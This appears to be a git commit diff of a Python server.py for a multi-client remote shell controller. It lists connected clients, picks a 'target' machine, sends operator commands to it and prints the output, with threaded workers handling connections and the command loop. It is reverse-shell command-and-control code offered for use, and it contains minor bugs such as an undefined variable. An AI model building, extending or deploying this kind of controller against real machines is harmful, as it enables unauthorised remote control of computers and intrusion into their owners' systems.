23f4c87b047b57b163d605d7258f12a718e93301
Arnason <stefan.arnason@dxc.com>
2020-04-04 22:56:31 +0100

    first working version

--- server.py
+++ server.py
@@ -38,33 +38,6 @@ def socket_bind():
         socket_bind()
 
 
-'''
-# Establish connection with client
-def socket_accept():
-    conn, address = s.accept()
-    print("Connection has been established | " + "IP " +
-          address[0] + " | Port " + str(address[1]))
-    send_commands(conn)
-    conn.close()
-
-
-# Send commands
-
-
-def send_commands(conn):
-    while True:
-        cmd = input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            # 1024 is the buffer size and has utf-8 encoding
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
-'''
-
 # Accept connections from multiple clients and save to list
 
 
@@ -111,13 +84,74 @@ def list_connections():
             del all_connections[i]
             del all_addresses[i]
             continue
-        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
+        results += str(i) + '   ' + \
+            str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
     print('------ Clients ------' + '\n' + results)
 
-def main():
-    socket_create()
-    socket_bind()
-    # socket_accept()
+# Select a target client
 
 
-main()
+def get_target(cmd):
+    try:
+        target = cmd.split(" ")[1]
+        target = int(target)
+        conn = all_connections[target]
+        print("You are now connected to " + str(all_addresses[target][0]))
+        print(str(all_addresses[target][0]) + '>> ', end='')
+        return conn
+    except:
+        print("Not a valid selection")
+        return None
+
+# Connect with remote target client
+
+
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480), "utf-8")
+                print(client_response, end='')
+            if cmd == 'dc':
+                print("Disconnecting from " + str(all_addresses[target][0]))
+                break
+        except:
+            print("Connection was lost")
+            break
+
+# Create worker threads
+
+
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True  # Kills workers when program is closed
+        t.start()
+
+# Do the next job in the queue (one handles connections, the other sends commands)
+
+
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            socket_create()
+            socket_bind()
+            accept_connections()
+        if x == 2:
+            start_shelly()
+        queue.task_done()
+
+# Each list item is a new job
+
+
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+
+
+create_workers()
+create_jobs()
